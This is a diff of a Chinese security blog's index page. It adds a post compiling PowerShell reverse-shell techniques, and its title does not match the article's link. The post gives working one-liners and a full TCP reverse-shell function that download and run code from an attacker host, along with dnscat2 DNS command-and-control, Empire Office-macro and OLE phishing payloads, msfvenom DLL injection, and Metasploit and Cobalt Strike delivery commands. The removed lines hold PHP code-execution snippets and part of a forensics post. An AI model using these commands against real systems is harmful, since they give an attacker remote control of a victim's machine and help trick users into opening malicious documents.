@@ -554,6 +554,180 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/06/powershell反弹shell常见方式/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/06/powershell反弹shell常见方式/" itemprop="url">后渗透之meterpreter使用攻略</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-06T22:28:16+08:00">
+                2019-03-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>2018-03-06 首发于360安全客: <a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99793</a></p>
+<p>本文整理了通过powershell反弹shell的常见方式。利用powercat、dnscat2、nishang、Empire、PowerSploit、Metasploit、Cobalt strike、powershell自定义函数等方式反弹TCP/UDP/HTTP/HTTPS/ICMP/DNS等类型shell。</p>
+<h4 id="测试环境说明"><a href="#测试环境说明" class="headerlink" title="测试环境说明"></a>测试环境说明</h4><p>攻击者：KALI2.0 32位 192.168.159.134<br>攻击者2：Ubuntu 14.04 LTS 192.168.159.129 （仅在dnscat2 反弹DNS shell中使用）<br>目标机：Windows Server 2008 X64 192.168.159.138</p>
+<h3 id="1-powercat反弹shell"><a href="#1-powercat反弹shell" class="headerlink" title="1) powercat反弹shell"></a>1) powercat反弹shell</h3><p>powercat（<a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a> ）为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat</p>
+<p>攻击者(192.168.159.134)开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br><span class="line">或者使用powercat监听</span><br><span class="line">powercat -l -p 6666</span><br></pre></td></tr></table></figure></p>
+<p>目标机反弹cmd shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString</span><br><span class="line">(&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;);</span><br><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-nishang反弹shell"><a href="#2-nishang反弹shell" class="headerlink" title="2) nishang反弹shell"></a>2) nishang反弹shell</h3><p>Nishang(<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a> )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。说明：本文没有具体实现nishang反弹http/https shell</p>
+<h4 id="Reverse-TCP-shell"><a href="#Reverse-TCP-shell" class="headerlink" title="Reverse TCP shell"></a>Reverse TCP shell</h4><p>攻击者(192.168.159.134)开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure></p>
+<p>目标机执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com</span><br><span class="line">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br><span class="line">或者将nishang下载到攻击者本地：</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br></pre></td></tr></table></figure></p>
+<h4 id="Reverse-UDP-shell"><a href="#Reverse-UDP-shell" class="headerlink" title="Reverse UDP shell"></a>Reverse UDP shell</h4><p>攻击者(192.168.159.134)开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvup 53</span><br></pre></td></tr></table></figure></p>
+<p>目标机执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&apos;);</span><br><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53</span><br></pre></td></tr></table></figure></p>
+<h4 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h4><p>需要利用icmpsh_m.py (<a href="https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1</a> 来反弹ICMP shell。</p>
+<p>首先攻击端下载icmpsh_m.py文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icmpsh_m.py Usage：</span><br><span class="line">python icmpsh_m.py [Attacker IP] [Victim IP]</span><br></pre></td></tr></table></figure></p>
+<p>攻击者(192.168.159.134)执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包</span><br><span class="line">python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听</span><br></pre></td></tr></table></figure></p>
+<p>目标机(192.168.159.138)执行：<br>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp" target="_blank" rel="noopener">http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp</a> -IPAddress 192.168.159.134<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 3) 自定义powershell函数反弹shell</span><br><span class="line">利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1</span><br><span class="line"></span><br><span class="line">攻击者(192.168.159.134) 开启监听：</span><br></pre></td></tr></table></figure></p>
+<p>nc -lvp 6666<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">目标机执行：</span><br></pre></td></tr></table></figure></p>
+<p>powershell -nop -c “$client = New-Object Net.Sockets.TCPClient(‘192.168.159.134’,6666);$stream = $client.GetStream();<br>[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;<br>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );<br>$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);<br>$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">或者保存为lltest_tcp.ps1文件</span><br></pre></td></tr></table></figure></p>
+<p>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.159.134/lltest_tcp.ps1&#39;);Invoke-lltestTcp" target="_blank" rel="noopener">http://192.168.159.134/lltest_tcp.ps1&#39;);Invoke-lltestTcp</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lltest_tcp.ps1 如下：</span><br></pre></td></tr></table></figure></p>
+<p>function Invoke-lltestTcp<br>{<br>$client = New-Object Net.Sockets.TCPClient(‘192.168.159.134’,6666)<br>$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}<br>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)<br>{<br>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)<br>$sendback = (iex $data 2&gt;&amp;1 | Out-String )<br>$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘<br>$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)<br>$stream.Write($sendbyte,0,$sendbyte.Length)<br>$stream.Flush()<br>}<br>$client.Close()<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 4) dnscat2 反弹DNS shell</span><br><span class="line">dnscat2(https://github.com/iagox86/dnscat2 )是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(https://github.com/lukebaggett/dnscat2-powershell)</span><br><span class="line"></span><br><span class="line">#### 利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</span><br><span class="line"></span><br><span class="line">攻击者(Ubuntu 14.04 LTS 192.168.159.129)开启监听：</span><br></pre></td></tr></table></figure></p>
+<p>ruby dnscat2.rb –dns “domain=lltest.com,host=192.168.159.129” –no-cache -e open<br>-e open 不使用加密连接，默认使用加密<br>ruby dnscat2.rb —help 查看帮助<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">目标机执行：</span><br></pre></td></tr></table></figure></p>
+<p>powershell IEX (New-Object System.Net.Webclient).DownloadString(‘<a href="https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2" target="_blank" rel="noopener">https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2</a> -Domain lltest.com -DNSServer 192.168.159.129<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功反弹shell后，攻击者：</span><br></pre></td></tr></table></figure></p>
+<p>session -i 1 #进入到session 1<br>shell #执行之后会新生成一个session 需要通过session -i 2 切换<br>session -i 2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 5) Empire 结合office反弹shell</span><br><span class="line">Empire(https://github.com/EmpireProject/Empire ) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</span><br><span class="line"></span><br><span class="line">#### 利用office 宏反弹shell</span><br><span class="line">攻击者(192.168.159.134)开启监听:</span><br></pre></td></tr></table></figure></p>
+<p>uselistener http<br>execute<br>back<br>usestager windows/macro http #生成payload<br>execute<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">生成/tmp/macro 攻击代码后，新建一个word 创建宏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(.doc)”或者“启用宏的Word 文档(.docm)”文件，当诱导目标打开，执行宏后，即可成功反弹shell：</span><br><span class="line">说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 利用office OLE对象插入bat文件反弹shell</span><br><span class="line">攻击者(192.168.159.134)开启监听 并生成bat文件payload：</span><br></pre></td></tr></table></figure></p>
+<p>listeners<br>usestager windows/launcher_bat http<br>execute<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在word中“插入”-“对象”-“由文件创建” 处，插入launcher.bat文件，可更改文件名称和图标，进行伪装，当诱导目标点击launcher_lltest.xls文件，执行后，即可成功反弹shell：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 6) PowerSploit DLL注入反弹shell</span><br><span class="line">PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。</span><br><span class="line">利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell</span><br><span class="line"></span><br><span class="line">1）msfvenom生成dll后门</span><br></pre></td></tr></table></figure></p>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">说明：目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2）metasploit 设置payload 开启监听</span><br></pre></td></tr></table></figure></p>
+<p>use exploit/multi/handler<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>set LHOST 192.168.159.134<br>set LPORT 6667<br>exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3）powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门</span><br><span class="line">首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程</span><br><span class="line"></span><br><span class="line">目标机执行:</span><br></pre></td></tr></table></figure></p>
+<p>Get-Process #选择要注入的进程<br>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;" target="_blank" rel="noopener">http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;</a>)<br>Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 7) metasploit反弹shell</span><br><span class="line">利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell</span><br><span class="line"></span><br><span class="line">攻击者(192.168.159.134)：</span><br></pre></td></tr></table></figure></p>
+<p>use exploit/multi/script/web_delivery<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set target 2<br>set LHOST 192.168.159.134<br>set LPORT 6666<br>exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标机执行：</span><br></pre></td></tr></table></figure></p>
+<p>powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();<br>$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring(‘<a href="http://192.168.159.134:8080/4iNSwaMtwWjm&#39;)" target="_blank" rel="noopener">http://192.168.159.134:8080/4iNSwaMtwWjm&#39;)</a>;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 8) Cobalt strike反弹shell</span><br><span class="line">Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvr32等进行反弹shell，类似metasploit的web_delivery模块</span><br><span class="line">说明：安装Cobalt strike时推荐 java version “1.8.0_121”</span><br><span class="line"></span><br><span class="line">1)运行服务端</span><br></pre></td></tr></table></figure></p>
+<p>./teamserver 192.168.159.134 lltest #lltest为连接密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2)运行客户端：</span><br></pre></td></tr></table></figure></p>
+<p>./cobaltstrike #用户名随便输入 密码lltest<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3)开启监听:</span><br><span class="line">首先要创建一个Listener, 点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可创建Listeners</span><br><span class="line"></span><br><span class="line">点击Cobalt Strike-&gt;Listeners</span><br><span class="line">payload可选择windows/beacon_http/reverse_http</span><br><span class="line">说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。</span><br><span class="line"></span><br><span class="line">4)生成powershell payload:</span><br><span class="line">点击Attack -&gt; Web Drive-by -&gt; Scripted Web Delivery</span><br><span class="line">Type选择 powershell</span><br><span class="line"></span><br><span class="line">5)目标机执行powershell payload:</span><br></pre></td></tr></table></figure></p>
+<p>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://192.168.159.134:83/a&#39;))&quot;" target="_blank" rel="noopener">http://192.168.159.134:83/a&#39;))&quot;</a><br><code>`</code><br>6)成功反弹shell后，右键interact 进入shell</p>
+<p>参考<br><a href="https://decoder.cloud/2017/01/26/dirty-tricks-with-powershell/" target="_blank" rel="noopener">https://decoder.cloud/2017/01/26/dirty-tricks-with-powershell/</a><br><a href="https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/</a><br><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/" target="_blank" rel="noopener">https://enigma0x3.net/2016/03/15/phishing-with-empire/</a><br><a href="http://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/" target="_blank" rel="noopener">http://www.hackingarticles.in/command-injection-exploitation-using-web-delivery-linux-windows/</a><br><a href="https://evi1cg.me/archives/Nishang_shells.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Nishang_shells.html</a><br><a href="https://evi1cg.me/archives/Cobalt_strike.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Cobalt_strike.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/17/ThinkPHP典型漏洞总结20190111/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1718,189 +1892,6 @@
 <h4 id="20-preg-replace"><a href="#20-preg-replace" class="headerlink" title="20)    preg_replace()"></a>20)    preg_replace()</h4><p>php7.0.0不再支持 /e修饰符；php5.5.0     /e 修饰符已被弃用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;a&apos;],&quot;abcd&quot;);</span><br><span class="line">//xxx.php?a=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <h4 id="21"><a href="#21" class="headerlink" title="21)    $"></a>21)    $</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$&#123;phpinfo()&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>参考:<br><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>  php代码/命令执行漏洞<br><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a> eval长度限制绕过 &amp;&amp; PHP5.6新特性</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/29/取证分析之发现Windows恶意程序执行痕迹/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="pplsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/ppl.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="pplsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/29/取证分析之发现Windows恶意程序执行痕迹/" itemprop="url">取证分析之发现Windows恶意程序执行痕迹</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-29T09:38:36+08:00">
-                2018-10-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/应急响应/" itemprop="url" rel="index">
-                    <span itemprop="name">应急响应</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>2018-10-29 首发于阿里先知: <a href="https://xz.aliyun.com/t/3067" target="_blank" rel="noopener">https://xz.aliyun.com/t/3067</a></p>
-<p>本文主要简述当Windows系统中存在恶意可执行程序时，如何发现恶意程序的执行痕迹（文件路径、时间等），以及相关的辅助分析工具。<br>从注册表、文件、日志三个方面介绍，以及简单介绍下Win10中的几个特有功能。</p>
-<h3 id="一、注册表"><a href="#一、注册表" class="headerlink" title="一、注册表"></a>一、注册表</h3><h4 id="1-ShimCache"><a href="#1-ShimCache" class="headerlink" title="1)ShimCache"></a>1)ShimCache</h4><p>ShimCache 又称为AppCompatCache，从 Windows XP开始存在，用来识别应用程序兼容性问题。跟踪文件路径，大小和上次修改时间（LastModifiedTime）和上次更新时间（LastUpdateTime）。<br>其中在Windows7/8/10系统中最多包含1024条记录，Windows7/8/10系统中不存在“上次更新时间”。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182010-e26034c0-d9d1-1.png" alt=""></p>
-<h5 id="辅助工具AppCompatCacheParser"><a href="#辅助工具AppCompatCacheParser" class="headerlink" title="辅助工具AppCompatCacheParser"></a>辅助工具AppCompatCacheParser</h5><p><a href="https://github.com/EricZimmerman/AppCompatCacheParser/" target="_blank" rel="noopener">https://github.com/EricZimmerman/AppCompatCacheParser/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">AppCompatCacheParser.exe --csv d:\temp  -t</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182152-1f1ba99e-d9d2-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182204-2689023a-d9d2-1.png" alt=""></p>
-<h5 id="辅助工具ShimCacheParser"><a href="#辅助工具ShimCacheParser" class="headerlink" title="辅助工具ShimCacheParser"></a>辅助工具ShimCacheParser</h5><p><a href="https://github.com/mandiant/ShimCacheParser" target="_blank" rel="noopener">https://github.com/mandiant/ShimCacheParser</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">reg export &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache&quot; shimcache.reg</span><br><span class="line">ShimCacheParser.py -o out.csv -r D:\Tool\TEST\shimcache.reg -t</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182432-7ebb7ff0-d9d2-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182443-851cca34-d9d2-1.png" alt=""></p>
-<h4 id="2-UserAssist"><a href="#2-UserAssist" class="headerlink" title="2)UserAssist"></a>2)UserAssist</h4><p>userassist键值包含GUI应用执行的信息，如名称、路径、关联快捷方式、执行次数、上一次执行时间等。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&#123;GUID&#125;\Count</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182646-cea366e0-d9d2-1.png" alt="image.png"></p>
